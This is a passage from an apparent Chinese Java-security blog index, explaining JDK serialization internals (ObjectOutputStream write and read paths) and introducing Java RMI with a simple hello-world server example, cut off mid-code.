根据 obj 的类型去执行序列化操作，如果不符合序列化要求，那么会③位置抛出 <code>NotSerializableException</code> 异常。</p><h5 id="ObjectOutputStream-writeOrdinaryObject"><a href="#ObjectOutputStream-writeOrdinaryObject" class="headerlink" title="ObjectOutputStream#writeOrdinaryObject"></a>ObjectOutputStream#writeOrdinaryObject</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void <span class="built_in">writeOrdinaryObject</span>(Object obj,</span><br><span class="line">                                 ObjectStreamClass desc,</span><br><span class="line">                                 boolean unshared)</span><br><span class="line">    throws IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    try &#123;</span><br><span class="line">        desc<span class="selector-class">.checkSerialize</span>();</span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        bout<span class="selector-class">.writeByte</span>(TC_OBJECT);</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        <span class="built_in">writeClassDesc</span>(desc, false);</span><br><span class="line">        handles<span class="selector-class">.assign</span>(unshared ? null : obj);</span><br><span class="line">        <span class="comment">//③</span></span><br><span class="line">        if (desc.isExternalizable() &amp;&amp; !desc<span class="selector-class">.isProxy</span>()) &#123;</span><br><span class="line">            <span class="built_in">writeExternalData</span>((Externalizable) obj);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">        <span class="comment">//④</span></span><br><span class="line">            <span class="built_in">writeSerialData</span>(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        if (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack<span class="selector-class">.pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>①写入类的元数据，TC_OBJECT. 声明这是一个新的对象，如果写入的是一个 String 类型的数据，那么就需要 TC_STRING 这个标识。</p><p>②writeClassDesc 方法主要作用就是自上而下(从父类写到子类，注意只会遍历那些实现了序列化接口的类)写入描述信息。该方法内部会不断的递归调用，我们只需要关系这个方法是写入描述信息就好了</p><p>从这里可以知道，序列化过程需要额外的写入很多数据，例如描述信息，类数据等，因此序列化后占用的空间肯定会更大。</p><p>③ desc.isExternalizable() 判断需要序列化的对象是否实现了 Externalizable 接口，这个在上面已经演示过怎么使用的，在序列化过程就是在这个地方进行判断的。如果有，那么序列化的过程就就需要自己编写，writeExternalData 方法会回调，在这里就可以愉快地编写需要序列化的数据拉。</p><p>④ writeSerialData 在没有实现 Externalizable 接口时，就执行这个方法</p><h5 id="ObjectOutputstream-writeSerialData"><a href="#ObjectOutputstream-writeSerialData" class="headerlink" title="ObjectOutputstream#writeSerialData"></a>ObjectOutputstream#writeSerialData</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//① </span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;<span class="comment">//②</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);<span class="comment">//③</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>① desc.getClassDataLayout 会返回 ObjectStreamClass.ClassDataSlot[] ，我们来看看 ClassDataSlot 类，可以看到它是封装了 ObjectStreamClass 而已，所以我们就简单的认为 ① 这一步就是用于返回序列化对象及其父类的 ClassDataSlot[] 数组，我们可以从 ClassDataSlot 中获取对应 ObjectStreamClass 描述信息。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassDataSlot</span> &#123;</span><br><span class="line">    <span class="comment">/** class descriptor &quot;occupying&quot; this slot */</span></span><br><span class="line">    <span class="keyword">final</span> ObjectStreamClass <span class="keyword">desc</span>;</span><br><span class="line">    <span class="comment">/** true if serialized form includes data for this slot&#x27;s descriptor */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">boolean</span> hasData;</span><br><span class="line">    ClassDataSlot(ObjectStreamClass <span class="keyword">desc</span>, <span class="built_in">boolean</span> hasData) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">desc</span> = <span class="keyword">desc</span>;</span><br><span class="line">        <span class="keyword">this</span>.hasData = hasData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>② 开始遍历返回的数组，slotDesc 这个我们就简单将其看成对一个对象的描述吧。hasWriteObjectMethod 表示的是什么呢？这个其实就是你要序列化这个对象是否有 writeObject 这个 private 方法，注意哦，这个方法并不是任何接口的方法，而是我们手动写的，读者可以参考 ArrayList 代码，它内部就有这个方法。那么这个方法的作用是什么呢？这个方法我们在上面也演示过具体的使用，它就是用于自定义序列化过程的，读者可以返回到上面看看如果使用这个 writeObject 实现自定义序列化过程的。注意：其实这个过程不像实现 Externalizable 接口那样，自己完全去自定义序列化数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    <span class="comment">//手动序列化 arr  前面30个元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">        s.writeObject(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>③ defaultWriteFields 这个方法就是 JVM 自动帮我们序列化了，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">private <span class="type">void</span> defaultWriteFields(<span class="keyword">Object</span> obj, ObjectStreamClass <span class="keyword">desc</span>)</span><br><span class="line">    throws IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">Class</span>&lt;?&gt; cl = <span class="keyword">desc</span>.forClass();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">desc</span>.checkDefaultSerialize();</span><br><span class="line">    <span class="type">int</span> primDataSize = <span class="keyword">desc</span>.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="keyword">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="built_in">new</span> byte[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">desc</span>.getPrimFieldValues(obj, primVals);</span><br><span class="line">    //①</span><br><span class="line">    bout.<span class="keyword">write</span>(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>);</span><br><span class="line">    ObjectStreamField[] fields = <span class="keyword">desc</span>.getFields(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">Object</span>[] objVals = <span class="built_in">new</span> <span class="keyword">Object</span>[<span class="keyword">desc</span>.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    <span class="keyword">desc</span>.getObjFieldValues(obj, objVals);</span><br><span class="line">    </span><br><span class="line">    //②</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                &quot;field (class \&quot;&quot; + desc.getName() + &quot;\&quot;, name: \&quot;&quot; +</span><br><span class="line">                fields[numPrimFields + i].getName() + &quot;\&quot;, type: \&quot;&quot; +</span><br><span class="line">                fields[numPrimFields + i].getType() + &quot;\&quot;)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            writeObject0(objVals[i],</span><br><span class="line">                         fields[numPrimFields + i].isUnshared());</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法主要分为以下两步</p><ul><li>① 写入基本数据类型的数据</li><li>②写入引用数据类型的数据，这里最终又调用到了 writeObject0() 方法</li></ul><h3 id="readObject-原理分析"><a href="#readObject-原理分析" class="headerlink" title="readObject 原理分析"></a>readObject 原理分析</h3><p>从流中读取类的描述信息 ObjectStreamClass 实例，通过这个对象就可以创建出序列化的对象。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ObjectStreamClass <span class="keyword">desc</span> = readClassDesc(<span class="literal">false</span>);</span><br><span class="line">...</span><br><span class="line">  Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">//创建对应反序列化的对象</span></span><br><span class="line">    obj = <span class="keyword">desc</span>.isInstantiable() ? <span class="keyword">desc</span>.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">        <span class="keyword">desc</span>.forClass().getName(),</span><br><span class="line">        <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取该对象及其对象的父类的 ObjectStreamClass信息</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectStreamClass.ClassDataSlot[] slots <span class="operator">=</span> desc.getClassDataLayout()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>然后遍历得到每一个 ObjectStreamClass 对象，将对应的属性值赋值给需要反序列化的对象</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> defaultReadFields(Object obj, ObjectStreamClass <span class="keyword">desc</span>)</span><br><span class="line">    throws IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = <span class="keyword">desc</span>.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> primDataSize = <span class="keyword">desc</span>.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="built_in">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">desc</span>.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> objHandle = passHandle;</span><br><span class="line">    <span class="comment">//从 ObjectStreamClass 中得到对象的所有 Field 信息</span></span><br><span class="line">    ObjectStreamField[] fields = <span class="keyword">desc</span>.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> Object[<span class="keyword">desc</span>.getNumObjFields()];</span><br><span class="line">    <span class="built_in">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        ObjectStreamField f = fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(f.isUnshared());</span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//将数据保存到对象中去</span></span><br><span class="line">        <span class="keyword">desc</span>.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">https://blog.csdn.net/mocas_wang/article/details/107621010</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI机制</title>
      <link href="/2024/06/03/RMI%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/06/03/RMI%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="RMI机制"><a href="#RMI机制" class="headerlink" title="RMI机制"></a>RMI机制</h1><h2 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h2><p>RMI 是 Java 提供的一个完善的简单易用的远程方法调用框架，采用客户&#x2F;服务器通信方式，在服务器上部署了提供各种服务的远程对象，客户端请求访问服务器上远程对象的方法，它要求客户端与服务器端都是 Java 程序。</p><p>RMI 框架采用代理来负责客户与远程对象之间通过 Socket 进行通信的细节。RMI 框架为远程对象分别生成了客户端代理和服务器端代理。位于客户端的代理类被称为存根（Stub），位于服务器端的代理类被称为骨架（Skeleton）。</p><h2 id="RMI原理"><a href="#RMI原理" class="headerlink" title="RMI原理"></a>RMI原理</h2><p>当客户端调用远程对象的一个方法时，实际上是调用本地存根对象的相应方法。存根对象与远程对象具有同样的接口。存根采用一种与平台无关的编码方式，把方法的参数编码为字节序列，这个编码过程被称为参数编组。RMI 主要采用Java 序列化机制进行参数编组。</p><p>存根把以下请求信息发送给服务器：</p><ul><li>被访问的远程对象的名字</li><li>被调用的方法的描述</li><li>编组后的参数的字节序列</li></ul><p>服务器端接收到客户端的请求信息，然后由相应的骨架对象来处理这一请求信息，骨架对象执行以下操作：</p><ul><li>反编组参数，即把参数的字节序列反编码为参数</li><li>定位要访问的远程对象</li><li>调用远程对象的相应方法</li><li>获取方法调用产生的返回值或者异常，然后对它进行编组</li><li>把编组后的返回值或者异常发送给客户</li></ul><h2 id="RMI流程"><a href="#RMI流程" class="headerlink" title="RMI流程"></a>RMI流程</h2><p>RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p><ol><li>RMI 客户端在调用远程方法时会先创建 Stub ( <code>sun.rmi.registry.RegistryImpl_Stub</code> )。</li><li>Stub 会将 Remote 对象传递给远程引用层 ( <code>java.rmi.server.RemoteRef</code> ) 并创建 <code>java.rmi.server.RemoteCall</code>( 远程调用 )对象。</li><li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li><li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li><li>RMI服务端的远程引用层( <code>sun.rmi.server.UnicastServerRef</code> )收到请求会请求传递给 Skeleton ( <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code> )。</li><li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li><li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li><li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li><li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li><li>RMI 客户端反序列化 RMI 远程方法调用结果。</li></ol><p><img src="https://img.picui.cn/free/2024/06/03/665dc386e1611.png" alt="image-20240506201952188.png"></p><p>首先，先启动rmiregistry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。其次，server端在本地先实例化一个提供服务的实现类，也就是创建远程对象，然后通过RMI提供的Naming&#x2F;Context&#x2F;Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到rmiregistry上并对外暴露一个名称。最后，client端通过本地的接口和一个已知的名称（即rmiregistry暴露出的名称）再使用RMI提供的Naming&#x2F;Context&#x2F;Registry等类的lookup方法从RMIService那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。</p><h2 id="RMI示例"><a href="#RMI示例" class="headerlink" title="RMI示例"></a>RMI示例</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="创建接口"><a href="#创建接口" class="headerlink" title="创建接口"></a>创建接口</h4><p>创建一个接口hello，该接口需要继承Remote接口，接口所定义的方法需要抛出RemoteException异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.RMItest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="comment">//远程接口，该接口需要继承Remote接口，并且接口中的方法全都要抛出RemoteException异常</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">welcome</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实现接口类"><a href="#实现接口类" class="headerlink" title="实现接口类"></a>实现接口类</h4><p>基于上面定义的接口实现一个类hello1，该实现类需要继承<code>UnicastRemoteObject</code>类，因为<code>UnicastRemoteObject</code>类提供了许多为实现远程通信所必需的功能，可以帮助快速实现RMI的远程接口，而且<code>UnicastRemoteObject</code>类用于生成 Stub（存根）和 Skeleton（骨架），如果不继承此类，则需要手动实现<code>java.rmi.RemoteStub</code>和<code>java.rmi.RemoteSkeleton</code>。同样重载的方法需要抛出RemoteException异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.RMItest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello1</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="comment">//因为UnicastRemoteObject的构造方法抛出了RemoteException异常，因此这里默认的构造方法也必须抛出RemoteException异常</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">hello1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">welcome</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果一个远程类已经继承了其他类，无法再继承 UnicastRemoteObiect 类，那么可以在构造方法中调用  UnicastRemoteObject 类的静态 expotObject 方法，该方法负责将对象导出为远程对象，使其能够在网络上可用，同样，远程类的构造方法也必须声明抛出  RemoteException</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello2</span> <span class="keyword">implements</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function">String <span class="title">welcome</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">hello2</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="comment">//参数 port 指定监听的端口，如果取值为0，就表示监听任意一个匿名端口</span></span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="创建服务端"><a href="#创建服务端" class="headerlink" title="创建服务端"></a>创建服务端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.RMItest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">//创建远程对象</span></span><br><span class="line">        <span class="type">hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">hello1</span>();</span><br><span class="line">        <span class="comment">//在本地主机上创建了一个RMI注册表（Registry）的实例，并监听在端口1099上，使得客户端可以通过注册表查找并访问远程对象，1099是RMI默认的注册表端口。</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//通过registry.rebind()方法，将之前创建的远程对象hello与一个字符串名称&quot;hello&quot;绑定在一起，并注册到RMI注册表中，这意味着客户端可以通过查找名称&quot;hello&quot;来获取到这个远程对象的引用，进而调用其提供的远程方法。</span></span><br><span class="line">        registry.rebind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外向注册器注册远程对象有三种方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 